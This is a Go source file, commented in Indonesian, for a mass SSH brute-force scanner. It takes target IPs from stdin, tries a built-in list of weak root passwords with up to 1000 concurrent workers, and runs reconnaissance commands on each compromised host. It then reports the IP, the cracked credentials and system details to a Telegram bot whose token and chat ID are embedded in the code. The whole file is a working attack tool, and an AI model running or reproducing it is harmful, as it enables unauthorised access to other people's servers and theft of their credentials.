package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/crypto/ssh"
)

// Konfigurasi utama
const (
	MAX_WORKERS         = 1000
	CONNECT_TIMEOUT     = 5 * time.Second
	CMD_TIMEOUT         = 5 * time.Second
	TELEGRAM_RATE_LIMIT = 500 * time.Millisecond
	MAX_QUEUE_SIZE      = 100000
	IPINFO_TIMEOUT      = 3 * time.Second
)

// Daftar kredensial (hanya root)
var credentials = []struct {
	User string
	Pass string
}{
	  {"root", "root"},
    {"root", "root1"},
    {"root", "root12"},
    {"root", "root123"},
    {"root", "root1234"},
    {"root", "root12345"},
    {"root", "root123456"},
    {"root", "admin"},
    {"root", "admin1"},
    {"root", "admin12"},
    {"root", "admin123"},
    {"root", "admin1234"},
    {"root", "admin12345"},
    {"root", "admin123456"},
    {"root", "12345678"},
    {"root", "123456789"},
    {"root", "1234567890"},
    {"root", "000000"},
    {"root", "111111"},
    {"root", "666666"},
    {"root", "888888"},
    {"root", "freeserver"},
    {"root", "freevps"},
    {"root", "server"},
    {"root", "server123"},
    {"root", "password"},
    {"root", "password123"},
    {"root", "pass123"},
    {"root", "user123"},
    {"root", "test123"},
    {"root", "login123"},
    {"root", "system123"},
    {"root", "master123"},
    {"root", "linux123"},
    {"root", "vps123"},
    {"root", "vpsadmin"},
    {"root", "sshadmin"},
    {"root", "qwerty"},
    {"root", "qazwsx"},
    {"root", "wsxedc"},
}

// Variabel global statistik
var (
	totalAttempted uint64
	totalConnected uint64
	totalSuccess   uint64
	totalInvalid   uint64
	muTelegram     sync.Mutex
	lastTelegram   time.Time
)

// Konfigurasi Telegram (ganti dengan milik Anda)
var (
	telegramBotToken = "8192157332:AAGwwFtVYqv9xokmnv9Mty3p1WRKWd80Xzc"
	telegramChatID   = "-1003550641275"
	httpClient       = &http.Client{Timeout: 10 * time.Second}
)

// Struct untuk menyimpan hasil informasi sistem
type SystemInfo struct {
	TargetIP   string
	Whoami     string
	Hostname   string
	Virt       string
	Arch       string
	OS         string
	Timestamp  string
	Uptime     string
	Provider   string
	Valid      bool
	ErrorMsg   string
}

// Command gabungan dengan delimiter
const (
	START_DELIM = "===START==="
	SEP_DELIM   = "===SEP==="
	END_DELIM   = "===END==="
)

// Perintah gabungan yang dijalankan dalam satu session
var combinedCommand = fmt.Sprintf(
	`echo "%s"; hostname -I; echo "%s"; whoami; echo "%s"; hostname; echo "%s"; systemd-detect-virt 2>/dev/null || echo 'unknown'; echo "%s"; uname -m; echo "%s"; . /etc/os-release 2>/dev/null && echo $ID $VERSION_ID || echo 'unknown'; echo "%s"; date; echo "%s"; uptime -p 2>/dev/null || uptime; echo "%s"`,
	START_DELIM, SEP_DELIM, SEP_DELIM, SEP_DELIM, SEP_DELIM, SEP_DELIM, SEP_DELIM, END_DELIM,
)

// Keywords yang menandakan command tidak valid (permission denied dihapus sesuai permintaan)
var invalidKeywords = []string{
	"command not found",
	"unrecognized",
	"not found",
	"invalid",
	"error",
}

// Struct untuk target
type Target struct {
	IP string
}

// Scanner utama
type SSHScanner struct {
	hostQueue chan Target
	done      chan bool
	wg        sync.WaitGroup
	ctx       context.Context
	cancel    context.CancelFunc
}

func NewSSHScanner() *SSHScanner {
	ctx, cancel := context.WithCancel(context.Background())
	return &SSHScanner{
		hostQueue: make(chan Target, MAX_QUEUE_SIZE),
		done:      make(chan bool),
		ctx:       ctx,
		cancel:    cancel,
	}
}

// Eksekusi command gabungan dalam satu session, parsing output
func collectSystemInfo(client *ssh.Client, ip string) (*SystemInfo, bool) {
	session, err := client.NewSession()
	if err != nil {
		return &SystemInfo{Valid: false, ErrorMsg: fmt.Sprintf("session creation failed: %v", err)}, false
	}
	defer session.Close()

	ctx, cancel := context.WithTimeout(context.Background(), CMD_TIMEOUT)
	defer cancel()
	go func() {
		<-ctx.Done()
		if ctx.Err() == context.DeadlineExceeded {
			session.Close()
		}
	}()

	var stdout, stderr strings.Builder
	session.Stdout = &stdout
	session.Stderr = &stderr

	err = session.Run(combinedCommand)
	if err != nil {
		output := strings.TrimSpace(stderr.String())
		if output == "" {
			output = stdout.String()
		}
		return &SystemInfo{Valid: false, ErrorMsg: fmt.Sprintf("command execution failed: %v - %s", err, output)}, false
	}

	raw := stdout.String()
	startIdx := strings.Index(raw, START_DELIM)
	endIdx := strings.Index(raw, END_DELIM)
	if startIdx == -1 || endIdx == -1 || endIdx <= startIdx {
		return &SystemInfo{Valid: false, ErrorMsg: "invalid command output format"}, false
	}
	body := raw[startIdx+len(START_DELIM) : endIdx]
	parts := strings.Split(body, SEP_DELIM)
	if len(parts) != 8 {
		return &SystemInfo{Valid: false, ErrorMsg: fmt.Sprintf("unexpected number of fields: %d", len(parts))}, false
	}
	info := &SystemInfo{
		TargetIP:  strings.TrimSpace(parts[0]),
		Whoami:    strings.TrimSpace(parts[1]),
		Hostname:  strings.TrimSpace(parts[2]),
		Virt:      strings.TrimSpace(parts[3]),
		Arch:      strings.TrimSpace(parts[4]),
		OS:        strings.TrimSpace(parts[5]),
		Timestamp: strings.TrimSpace(parts[6]),
		Uptime:    strings.TrimSpace(parts[7]),
		Valid:     true,
	}
	// Validasi anti-trash filter (tanpa permission denied)
	importantFields := []string{info.Hostname, info.Arch, info.Virt}
	for _, field := range importantFields {
		lower := strings.ToLower(field)
		for _, kw := range invalidKeywords {
			if strings.Contains(lower, kw) {
				info.Valid = false
				info.ErrorMsg = fmt.Sprintf("invalid keyword '%s' found in output", kw)
				return info, false
			}
		}
	}
	// Pastikan whoami adalah root
	if info.Whoami != "root" {
		info.Valid = false
		info.ErrorMsg = "user is not root"
		return info, false
	}
	// Jika target_ip kosong, gunakan IP asli
	if info.TargetIP == "" {
		info.TargetIP = ip
	}
	info.Provider = getProvider(ip)
	return info, true
}

// Mendapatkan provider (org) dari ipinfo.io
func getProvider(ip string) string {
	ctx, cancel := context.WithTimeout(context.Background(), IPINFO_TIMEOUT)
	defer cancel()
	url := fmt.Sprintf("https://ipinfo.io/%s/org", ip)
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return "unknown"
	}
	resp, err := httpClient.Do(req)
	if err != nil {
		return "unknown"
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "unknown"
	}
	org := strings.TrimSpace(string(body))
	if org == "" || strings.Contains(strings.ToLower(org), "error") {
		return "unknown"
	}
	return org
}

// Proses login untuk satu target
func (s *SSHScanner) processTarget(ip string) {
	addr := fmt.Sprintf("%s:22", ip)
	for _, cred := range credentials {
		select {
		case <-s.ctx.Done():
			return
		default:
		}
		config := &ssh.ClientConfig{
			User: cred.User,
			Auth: []ssh.AuthMethod{
				ssh.Password(cred.Pass),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         CONNECT_TIMEOUT,
		}
		client, err := ssh.Dial("tcp", addr, config)
		if err != nil {
			continue
		}
		atomic.AddUint64(&totalConnected, 1)
		logMessage("SUCCESS", ip, fmt.Sprintf("Logged in with %s:%s", cred.User, cred.Pass))
		info, valid := collectSystemInfo(client, ip)
		client.Close()
		if !valid || !info.Valid {
			atomic.AddUint64(&totalInvalid, 1)
			logMessage("INVALID", ip, fmt.Sprintf("System info invalid: %s", info.ErrorMsg))
			return
		}
		atomic.AddUint64(&totalSuccess, 1)
		logMessage("SUCCESS", ip, "System info collected successfully")
		s.sendTelegram(ip, cred.User, cred.Pass, info)
		return
	}
}

// Mengirim notifikasi ke Telegram dengan format HTML dan emoji
func (s *SSHScanner) sendTelegram(ip, user, pass string, info *SystemInfo) {
	if telegramBotToken == "YOUR_BOT_TOKEN" || telegramChatID == "YOUR_CHAT_ID" {
		return
	}
	muTelegram.Lock()
	defer muTelegram.Unlock()
	if time.Since(lastTelegram) < TELEGRAM_RATE_LIMIT {
		time.Sleep(TELEGRAM_RATE_LIMIT - time.Since(lastTelegram))
	}
	lastTelegram = time.Now()
	escape := func(s string) string {
		return html.EscapeString(s)
	}
	targetIP := info.TargetIP
	if targetIP == "" {
		targetIP = ip
	}
	text := fmt.Sprintf(`🚀 <b>SSH Intelligence Report</b> 📋

<code>=== SSH Found ✅ ===</code>

🌐 <b>Target:</b> <code>%s:22</code>
🔑 <b>Credentials:</b> <code>%s:%s</code>
🖥️ <b>Provider:</b> <code>%s</code>
🖥️ <b>Hostname:</b> <code>%s</code>
⚙️ <b>Systemd:</b> <code>%s</code>
🛌 <b>Arsitektur:</b> <code>%s</code>
🐧 <b>OS:</b> <code>%s</code>
🕒 <b>Timestamp:</b> <code>%s</code>
⏳ <b>Uptime:</b> <code>%s</code>`,
		escape(targetIP), escape(user), escape(pass),
		escape(info.Provider),
		escape(info.Hostname),
		escape(info.Virt),
		escape(info.Arch),
		escape(info.OS),
		escape(info.Timestamp),
		escape(info.Uptime),
	)
	payload := map[string]string{
		"chat_id":    telegramChatID,
		"text":       text,
		"parse_mode": "HTML",
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		logMessage("ERROR", ip, fmt.Sprintf("JSON marshal error: %v", err))
		return
	}
	resp, err := httpClient.Post("https://api.telegram.org/bot"+telegramBotToken+"/sendMessage", "application/json", bytes.NewReader(jsonData))
	if err != nil {
		logMessage("ERROR", ip, fmt.Sprintf("Telegram post error: %v", err))
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
}

// Worker goroutine
func (s *SSHScanner) worker() {
	defer s.wg.Done()
	for target := range s.hostQueue {
		select {
		case <-s.ctx.Done():
			return
		default:
			s.processTarget(target.IP)
		}
		atomic.AddUint64(&totalAttempted, 1)
	}
}

// Statistik real-time
func (s *SSHScanner) statsPrinter() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-s.ctx.Done():
			return
		case <-ticker.C:
			attempted := atomic.LoadUint64(&totalAttempted)
			connected := atomic.LoadUint64(&totalConnected)
			success := atomic.LoadUint64(&totalSuccess)
			invalid := atomic.LoadUint64(&totalInvalid)
			fmt.Printf("\r[STATS] Attempted: %d | Connected: %d | Success: %d | Invalid: %d | Workers: %d",
				attempted, connected, success, invalid, runtime.NumGoroutine())
		}
	}
}

// Logging ke terminal
func logMessage(tag, ip, msg string) {
	fmt.Printf("[%s] %s: %s\n", tag, ip, msg)
}

// Menangani sinyal interrupt (Ctrl+C)
func (s *SSHScanner) handleSignals() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan
	fmt.Println("\n[!] Shutting down gracefully...")
	s.cancel()
	close(s.done)
}

// Menjalankan scanner
func (s *SSHScanner) Run() {
	fmt.Println("=== SSH Brute Force Scanner with System Intelligence ===")
	fmt.Printf("Max workers: %d\n", MAX_WORKERS)
	fmt.Printf("Queue size: %d\n", MAX_QUEUE_SIZE)
	fmt.Println("Reading targets from stdin...")
	go s.statsPrinter()
	go s.handleSignals()
	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			ip := strings.Split(line, ":")[0]
			select {
			case s.hostQueue <- Target{IP: ip}:
			case <-s.ctx.Done():
				return
			}
		}
		close(s.hostQueue)
	}()
	for i := 0; i < MAX_WORKERS; i++ {
		s.wg.Add(1)
		go s.worker()
	}
	s.wg.Wait()
	s.done <- true
	fmt.Println("\n[+] Scanner finished.")
	printFinalStats()
}

func printFinalStats() {
	fmt.Printf("\n========== FINAL STATS ==========\n")
	fmt.Printf("Total attempted: %d\n", atomic.LoadUint64(&totalAttempted))
	fmt.Printf("Total connected: %d\n", atomic.LoadUint64(&totalConnected))
	fmt.Printf("Total success (valid Linux): %d\n", atomic.LoadUint64(&totalSuccess))
	fmt.Printf("Total invalid (non-Linux/error): %d\n", atomic.LoadUint64(&totalInvalid))
}

func main() {
	scanner := NewSSHScanner()
	scanner.Run()
}
